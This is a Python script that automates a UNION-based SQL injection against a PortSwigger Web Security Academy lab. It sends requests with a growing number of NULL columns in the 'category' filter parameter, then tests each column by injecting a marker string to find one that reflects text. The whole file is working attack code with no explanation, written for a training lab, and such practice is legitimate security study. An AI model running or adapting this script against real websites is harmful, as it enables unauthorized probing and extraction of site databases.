import requests
import random

Payload ="'+UNION+SELECT+NULL--"
loop = True
i = 1
i2 = 0

while loop:
    burp0_url = ("https://ac961fdb1ed81922805b7f5100a7005f.web-security-academy.net/filter?category="+Payload)
    burp0_headers = {"Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Accept-Language": "en", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36", "Connection": "close"}
    Response = requests.get(burp0_url, headers=burp0_headers)
    if Response.status_code == 500:
        print(Payload + " : False")
        print(Response.headers['content-length'])
    if Response.status_code == 200:
        loop = False
        print(Payload + " : True")
        print(Response.headers['content-length'])
        Payload2 = Payload
        Flag = True
        while i2 < i:
            if Flag == True:
                Pos = (Payload.find('NULL'))
                Payload = Payload[:Pos] + "'7EZsDN'" + Payload[Pos+4:]
                Flag = False
                burp0_url = ("https://ac961fdb1ed81922805b7f5100a7005f.web-security-academy.net/filter?category="+Payload)
                burp0_headers = {"Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Accept-Language": "en", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36", "Connection": "close"}
                Response = requests.get(burp0_url, headers=burp0_headers)
                if Response.status_code == 500:
                    print(Payload + " : False")
                    print(Response.headers['content-length'])
                if Response.status_code == 200:
                    print(Payload + " : True")
                    print(Response.headers['content-length'])
                    exit()
            else:
                Payload = Payload2
                Pos = (Payload.find('NULL',Pos+4))
                Payload = Payload[:Pos] + "'7EZsDN'" + Payload[Pos+4:]
                burp0_url = ("https://ac961fdb1ed81922805b7f5100a7005f.web-security-academy.net/filter?category="+Payload)
                burp0_headers = {"Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Accept-Language": "en", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36", "Connection": "close"}
                Response = requests.get(burp0_url, headers=burp0_headers)
                if Response.status_code == 500:
                    print(Payload + " : False")
                    print(Response.headers['content-length'])
                if Response.status_code == 200:
                    print(Payload + " : True")
                    print(Response.headers['content-length'])
                    exit()
            i2 +=1
        exit()
    Payload = Payload[:-2]
    Payload = Payload+",NULL--"
    i +=1
